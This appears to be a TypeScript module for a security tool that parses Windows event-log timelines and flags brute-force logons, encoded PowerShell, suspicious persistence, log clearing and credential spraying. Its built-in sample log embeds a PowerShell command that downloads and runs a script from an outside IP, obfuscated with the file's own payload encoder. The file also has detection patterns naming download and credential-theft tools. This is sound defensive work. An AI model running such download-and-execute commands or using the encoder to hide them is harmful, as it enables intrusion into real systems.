/**
 * Super-timeline analysis — CSV in (timestamp,host,source,event_id,level,message),
 * findings out. Detectors: ENCODED_PS, BRUTE_FORCE_SUCCESS, NEW_SERVICE_SUSPICIOUS,
 * SCHEDULED_TASK_SUSPICIOUS, TEMP_EXEC, LOG_CLEARED, EXPLICIT_SPRAY.
 */
import {
  type DetectionReport,
  type Finding,
  computeVerdict,
} from "@/lib/detection/types";
import { formatDuration } from "@/lib/detection/format";

export interface TimelineEntry {
  ts: string;
  host: string;
  source: string;
  eventId: string;
  level: string;
  message: string;
  line: number;
}

export function parseTimeline(text: string): TimelineEntry[] {
  const entries: TimelineEntry[] = [];
  const lines = text.split(/\r?\n/);
  for (let i = 0; i < lines.length; i++) {
    const raw = (lines[i] ?? "").trim();
    if (!raw) continue;
    if (/^timestamp\b/i.test(raw)) continue; // header row
    const fields = splitCsvLine(raw);
    if (fields.length >= 6) {
      const [ts, host, source, eventId, level, ...rest] = fields;
      entries.push({
        ts: (ts ?? "").trim(),
        host: (host ?? "").trim(),
        source: (source ?? "").trim(),
        eventId: (eventId ?? "").trim(),
        level: (level ?? "").trim(),
        message: rest.join(",").trim(),
        line: i + 1,
      });
      continue;
    }
    // Fallback: treat whole line as a message, try to pull a timestamp out.
    const tsMatch = raw.match(/\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}/);
    const eventMatch = raw.match(/\b(4624|4625|4648|4688|4698|7045|1102|5001|1)\b/);
    entries.push({
      ts: tsMatch?.[0]?.replace(" ", "T") ?? "",
      host: "",
      source: "raw",
      eventId: eventMatch?.[1] ?? "",
      level: "Raw",
      message: raw,
      line: i + 1,
    });
  }
  return entries;
}

function splitCsvLine(line: string): string[] {
  const fields: string[] = [];
  let current = "";
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (inQuotes) {
      if (c === '"') {
        if (line[i + 1] === '"') {
          current += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        current += c;
      }
      continue;
    }
    if (c === '"') {
      inQuotes = true;
      continue;
    }
    if (c === ",") {
      fields.push(current);
      current = "";
      continue;
    }
    current += c;
  }
  fields.push(current);
  return fields;
}

// --- PowerShell -enc payload helpers ---------------------------------------

export function encodePsPayload(plain: string): string {
  const bytes = new Uint8Array(plain.length * 2);
  for (let i = 0; i < plain.length; i++) {
    bytes[i * 2] = plain.charCodeAt(i) & 0xff;
    bytes[i * 2 + 1] = (plain.charCodeAt(i) >> 8) & 0xff;
  }
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin);
}

function decodePsPayload(b64: string): string | null {
  try {
    const bin = atob(b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i) & 0xff;
    let out = "";
    for (let i = 0; i + 1 < bytes.length; i += 2) {
      const lo = bytes[i] ?? 0;
      const hi = bytes[i + 1] ?? 0;
      const code = lo | (hi << 8);
      if (code === 0) break;
      out += String.fromCharCode(code);
    }
    return out;
  } catch {
    return null;
  }
}

const SUSPICIOUS_PATH = /(\\Temp\\|\\AppData\\|\\Public\\|\\ProgramData\\)[^"',\s]*\.exe/i;
const IP_RE = /(?:\d{1,3}\.){3}\d{1,3}/g;

export function analyzeTimeline(entries: TimelineEntry[]): DetectionReport {
  const findings: Finding[] = [];
  const iocs = new Set<string>();

  // --- ENCODED_PS: powershell -enc <utf16le b64> ----------------------------
  const encoded = /(-enc(?:odedcommand)?|-e\b)\s+([A-Za-z0-9+/=]{40,})/i;
  for (const e of entries) {
    const m = e.message.match(encoded);
    if (!m) continue;
    const decoded = decodePsPayload(m[2] ?? "");
    if (decoded && /iex|invoke-expression|downloadstring|webclient|invoke-mimikatz|amsi|ffu/i.test(decoded)) {
      findings.push({
        rule: "ENCODED_PS",
        severity: "high",
        title: `Encoded PowerShell payload (${e.eventId || "process create"})`,
        detail: `Decodes to: ${decoded.slice(0, 180)}. Encoded download/execute — AMSI bypass or stageless loader.`,
        ioc: decoded.slice(0, 180),
      });
      iocs.add(decoded.slice(0, 180));
    } else {
      findings.push({
        rule: "ENCODED_PS",
        severity: "low",
        title: "Encoded PowerShell command line",
        detail:
          "A base64-encoded -enc payload is present. It did not match known download/execute markers, but encode-and-execute is rarely benign in this context — decode and review manually.",
      });
    }
  }

  // --- BRUTE_FORCE_SUCCESS: ≥5×4625 then a 4624 from the same IP -----------
  const fails = new Map<string, TimelineEntry[]>();
  const successes = new Map<string, TimelineEntry[]>();
  for (const e of entries) {
    if (e.eventId === "4625") {
      const ip = (e.message.match(IP_RE) ?? [])[0];
      if (ip) fails.set(ip, [...(fails.get(ip) ?? []), e]);
    }
    if (e.eventId === "4624") {
      const ip = (e.message.match(IP_RE) ?? [])[0];
      if (ip) successes.set(ip, [...(successes.get(ip) ?? []), e]);
    }
  }
  for (const [ip, failList] of fails) {
    if (failList.length < 5) continue;
    const wins = successes.get(ip) ?? [];
    if (wins.length > 0) {
      findings.push({
        rule: "BRUTE_FORCE_SUCCESS",
        severity: "high",
        title: `Brute force succeeded from ${ip}`,
        detail: `${failList.length} failed logons (4625) followed by a successful logon (4624) from the same source — classic password-spray/brute-then-enter. Rotate the impacted credentials and check lateral movement.`,
        ioc: ip,
      });
      iocs.add(ip);
    } else {
      findings.push({
        rule: "BRUTE_FORCE_SUCCESS",
        severity: "medium",
        title: `Password-spray storm from ${ip}`,
        detail: `${failList.length} failed logons with no success (yet) — block or rate-limit the source.`,
        ioc: ip,
      });
      iocs.add(ip);
    }
  }

  // --- NEW_SERVICE_SUSPICIOUS: 7045 / 4698 with suspicious binary path -----
  for (const e of entries) {
    if (e.eventId !== "7045" && e.eventId !== "4698") continue;
    const match = e.message.match(SUSPICIOUS_PATH);
    if (match) {
      findings.push({
        rule: "NEW_SERVICE_SUSPICIOUS",
        severity: "high",
        title: `${e.eventId === "7045" ? "Service" : "Scheduled task"} installed from ${match[1]} path`,
        detail: `Binary under a user-writable directory (${match[0]}). Persistence from Temp/AppData/Public is almost never legitimate software.`,
        ioc: match[0],
      });
      iocs.add(match[0]);
    } else if (/service|task/i.test(e.message)) {
      findings.push({
        rule: e.eventId === "7045" ? "NEW_SERVICE_SUSPICIOUS" : "SCHEDULED_TASK_SUSPICIOUS",
        severity: "medium",
        title: `${e.eventId === "7045" ? "New service (7045)" : "New scheduled task (4698)"} installed`,
        detail: "Persistence primitive installed during the incident window — confirm the signer and the binary path against the golden image.",
      });
    }
  }

  // --- TEMP_EXEC: executables launched from user-writable paths ------------
  for (const e of entries) {
    if (e.eventId !== "4688" && e.eventId !== "1") continue;
    const match = e.message.match(SUSPICIOUS_PATH);
    if (match) {
      findings.push({
        rule: "TEMP_EXEC",
        severity: "medium",
        title: "Executable launched from user-writable path",
        detail: match[0],
        ioc: match[0],
      });
      iocs.add(match[0]);
    }
  }

  // --- LOG_CLEARED: audit log wiped -----------------------------------------
  for (const e of entries) {
    if (e.eventId === "1102") {
      findings.push({
        rule: "LOG_CLEARED",
        severity: "medium",
        title: "Audit log cleared (Security 1102)",
        detail: "Event log wiped by an account — deliberate defense evasion. Recover traces from forwarded logs/SIEM if available.",
      });
    }
  }

  // --- EXPLICIT_SPRAY: many explicit-credential events across accounts ------
  const explicitUsers = new Set<string>();
  for (const e of entries) {
    if (e.eventId !== "4648") continue;
    const m = e.message.match(/Target Account Name:\s*([^\s,"]+)/i);
    const target = m?.[1];
    if (target) explicitUsers.add(target.toLowerCase());
  }
  if (explicitUsers.size >= 3) {
    findings.push({
      rule: "EXPLICIT_SPRAY",
      severity: "medium",
      title: "Explicit credential spraying (4648)",
      detail: `Explicit credentials used against ${explicitUsers.size} distinct accounts — credential harvesting/spraying pattern, typically with a shared local admin password.`,
    });
  }

  const verdict = computeVerdict(findings);
  const high = findings.filter((f) => f.severity === "high").length;
  const summary =
    verdict === "clean"
      ? "No high-confidence indicators in this timeline slice. Widen the window or ingest more artifacts if suspicion remains."
      : verdict === "suspicious"
        ? `${findings.length} anomaly(ies) exceed baseline. Anchor the timeline on the first high-severity event and walk ±30 minutes.`
        : `${high} high-severity event(s) — compromise narrative present (brute force → persistence → execution). Isolate the host and pivot every IoC into fleet-wide hunt.`;

  const timestamps = entries
    .map((e) => Date.parse(e.ts))
    .filter((n) => Number.isFinite(n));
  const span = timestamps.length
    ? formatDuration((Math.max(...timestamps) - Math.min(...timestamps)) / 1000)
    : "unknown";

  return {
    verdict,
    summary,
    findings: [...findings].sort((a, b) => severityValue(b.severity) - severityValue(a.severity)),
    iocs: [...iocs],
    stats: [
      { label: "Entries parsed", value: String(entries.length) },
      { label: "Timespan", value: span },
      { label: "4625 (failed logons)", value: String(entries.filter((e) => e.eventId === "4625").length) },
      { label: "7045/4698 (persistence)", value: String(entries.filter((e) => e.eventId === "7045" || e.eventId === "4698").length) },
    ],
  };
}

function severityValue(s: Finding["severity"]): number {
  return { high: 3, medium: 2, low: 1, info: 0 }[s];
}

/** Embedded attack narrative sample (CSV). Built at click-time. */
export function buildTimelineSample(): string {
  const payload =
    "IEX (New-Object Net.WebClient).DownloadString('http://185.220.14.9/p.ps1')";
  const encoded = encodePsPayload(payload);

  return [
    "2026-11-14T08:00:03,WKSTN-07,Microsoft-Windows-Security-Auditing,4624,Information,\"An account was successfully logged on. Subject: Security ID: j.smith Logon Type: 2 Workstation Name: WKSTN-07\"",
    "2026-11-14T08:00:41,WKSTN-07,Microsoft-Windows-Security-Auditing,4688,Information,\"A new process has been created. Creator: C:\\Program Files\\Mozilla Firefox\\firefox.exe\"",
    "2026-11-14T08:02:17,DC01,Microsoft-Windows-Security-Auditing,4624,Information,\"An account was successfully logged on. Logon Type: 3 Account Name: svc_backup Source Network Address: 10.0.0.8\"",
    "2026-11-14T08:03:31,WKSTN-07,Microsoft-Windows-Security-Auditing,4688,Information,\"A new process has been created. CommandLine: C:\\Program Files\\7-Zip\\7z.exe x quarterly.zip\"",
    "2026-11-14T08:04:19,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:04:21,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:04:22,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:04:23,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:04:25,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:04:26,DC01,Microsoft-Windows-Security-Auditing,4625,Information,\"An account failed to log on. Account Name: j.admin Source Network Address: 185.220.14.9 Status: 0xc000006a\"",
    "2026-11-14T08:05:02,DC01,Microsoft-Windows-Security-Auditing,4624,Information,\"An account was successfully logged on. Logon Type: 10 Account Name: j.admin Source Network Address: 185.220.14.9\"",
    "2026-11-14T08:07:44,WKSTN-07,Microsoft-Windows-Sysmon,1,Information,\"Process Create: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine: powershell.exe -nop -w hidden -enc " + encoded + "\"",
    "2026-11-14T08:09:12,WKSTN-07,Service Control Manager,7045,Information,\"A service was installed in the system. Service Name: WinUpdateDefender ImagePath: C:\\Users\\j.smith\\AppData\\Local\\Temp\\winupda.exe\"",
    "2026-11-14T08:11:36,WKSTN-07,Microsoft-Windows-Sysmon,1,Information,\"Process Create: Image: C:\\Users\\j.smith\\AppData\\Local\\Temp\\winupda.exe CommandLine: winupda.exe -s check\"",
    "2026-11-14T08:13:03,WKSTN-07,Microsoft-Windows-TaskScheduler,4698,Information,\"A scheduled task was created. Task Name: EdgeUpdateTaskMachineCore Actions: C:\\Users\\Public\\update.exe -k\"",
    "2026-11-14T08:15:47,WKSTN-07,Microsoft-Windows-Security-Auditing,4648,Information,\"A logon was attempted using explicit credentials. Account Name: svc_backup Source Network Address: 10.0.0.8 Target Account Name: Administrator\"",
    "2026-11-14T08:17:29,WKSTN-07,Microsoft-Windows-Security-Auditing,4648,Information,\"A logon was attempted using explicit credentials. Account Name: j.smith Source Network Address: WKSTN-07 Target Account Name: backupsvc\"",
    "2026-11-14T08:18:05,WKSTN-07,Microsoft-Windows-Security-Auditing,4648,Information,\"A logon was attempted using explicit credentials. Account Name: j.smith Source Network Address: WKSTN-07 Target Account Name: dbadmin\"",
    "2026-11-14T08:19:51,WKSTN-07,Microsoft-Windows-Eventlog,1102,Information,\"The audit log was cleared. Subject: j.smith\"",
    "2026-11-14T08:21:14,DC01,Microsoft-Windows-Security-Auditing,4624,Information,\"An account was successfully logged on. Logon Type: 3 Account Name: svc_backup Source Network Address: 10.0.0.8\"",
  ].join("\n");
}
